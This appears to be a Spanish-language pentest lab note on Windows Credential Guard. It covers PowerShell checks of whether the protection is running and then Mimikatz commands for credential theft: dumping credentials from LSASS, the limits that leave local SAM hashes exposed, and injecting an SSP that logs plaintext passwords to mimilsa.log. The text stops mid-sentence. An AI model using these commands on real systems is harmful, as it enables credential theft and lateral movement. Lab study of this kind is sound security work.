# Windows Credential Guard

### Verificar estado

> **Confirmar que Windows Credential Guard está habilitado**

```powershell
Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesConfigured, DeviceGuardSecurityServicesRunning
```

Ejemplo:

```
DeviceGuardSecurityServicesConfigured : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
DeviceGuardSecurityServicesRunning    : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
```

Hay que comprobar especialmente `DeviceGuardSecurityServicesRunning`, ya que indica los servicios de seguridad que están ejecutándose. Que aparezca únicamente en `Configured` no significa que esté activo.

Alternativa:

```powershell
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

***

### Mimikatz

> **Activar privilegio de debug (`SeDebugPrivilege`)**

```powershell
mimikatz # privilege::debug
```

***

> **Intentar extraer credenciales de LSASS**

```powershell
mimikatz # sekurlsa::logonpasswords
```

Con Credential Guard habilitado, determinados secretos de autenticación están aislados mediante VBS y no estarán disponibles para su extracción convencional desde LSASS.

***

### Limitaciones de Credential Guard

Credential Guard protege principalmente las credenciales de dominio, incluyendo hashes NTLM y tickets TGT de Kerberos.

Sin embargo, no protege las cuentas locales ni las cuentas Microsoft.

Esto significa que los hashes de las cuentas locales siguen almacenándose en la SAM y pueden obtenerse mediante técnicas específicas de extracción de dicha base de datos.

***

### SSP Injection

#### Mimikatz

> **Intentar inyectar un SSP en memoria**

```powershell
mimikatz # privilege::debug
mimikatz # misc::memssp
```

Mimikatz incorpora un SSP en la memoria de LSASS que permite registrar credenciales en texto claro durante posteriores procesos de autenticación compatibles.

**Importante:** Esta técnica no recupera las credenciales de sesiones anteriores. Es necesario que se produzca una nueva autenticación después de activar el SSP.

También hay que tener en cuenta que LSA Protection (RunAsPPL) puede impedir la modificación de LSASS mediante este procedimiento.

***

**Obtener las credenciales**

En este punto, para nuestro laboratorio, podemos cerrar la sesión RDP actual y volver a iniciar sesión utilizando otra cuenta de prueba.

Por ejemplo, iniciando una nueva sesión como `CORP\Administrator`.

Una vez realizada la autenticación, podemos consultar el archivo de log:

> **Consultar mimilsa.log**

```powershell
type C:\Windows\System32\mimilsa.log
```

Si la autenticación ha sido registrada
